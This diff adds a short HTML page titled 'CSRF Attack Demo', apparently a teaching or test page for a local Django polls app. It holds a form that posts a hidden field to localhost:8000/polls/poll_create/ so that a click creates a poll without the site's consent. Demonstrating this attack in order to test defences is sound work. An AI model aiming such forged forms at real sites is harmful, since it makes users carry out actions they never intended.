@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+
+<html>
+
+<head>
+    <title>CSRF Attack Demo</title>
+</head>
+
+<body>
+    <h1>See if you can commit cross-site request forgery</h1>
+
+    <form action="http://localhost:8000/polls/poll_create/" method="POST">
+        <input type="hidden" name="question" value="Should one be prepared for cross-site request forgery?">
+        <input type="submit" value="Why not">
+    </form>
+</body>
+
+</html>
